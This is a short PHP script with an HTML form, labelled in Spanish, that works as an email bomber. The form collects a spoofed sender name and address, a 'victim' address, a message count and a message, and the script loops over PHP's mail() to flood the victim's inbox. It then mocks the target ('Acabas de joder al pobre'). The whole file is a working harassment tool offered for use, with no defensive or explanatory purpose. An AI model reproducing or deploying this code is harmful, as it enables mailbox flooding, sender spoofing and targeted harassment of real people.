<?
if($enviar) {
$victima = $_POST['victima'];
$nombre = $_POST['nombre'];
$asunto = $_POST['asunto'];
$mensaje = $_POST['mensaje'];
$email = $_POST['email'];
$mails = $_POST['mails'];
$a=0;
while($a<$mails) {
mail($victima,$asunto,$mensaje,"From: $nombre <$email>\n");
$a++;
}
echo "Acabas de joder al pobre $victima";
}
?> <form name="form1" method="post" action="<? echo $PHP_SELF; ?>">
<div align="center">Contacto General</div>
<div align="center">
    Nombre:<br>
    <input name="nombre" type="text" class=inbox id="nombre">
    <br>
Email Falso:<br>
<input type="text" name="email" class=inbox>
<br>
Victima:<br>
<input type="text" name="victima" class=inbox>
<br>
Mails:<br>
<input name="mails" type="text" class=inbox id="mails">
<br>
Asunto:<br>
<input name="asunto" type="text" class=inbox id="asunto">
<br>
Mensaje:<br>
<textarea name="mensaje" cols="30" rows="5" class=inbox></textarea>
<br>
<br>
<input type="submit" name="enviar" value="Enviar" class=boton>
  </div></form>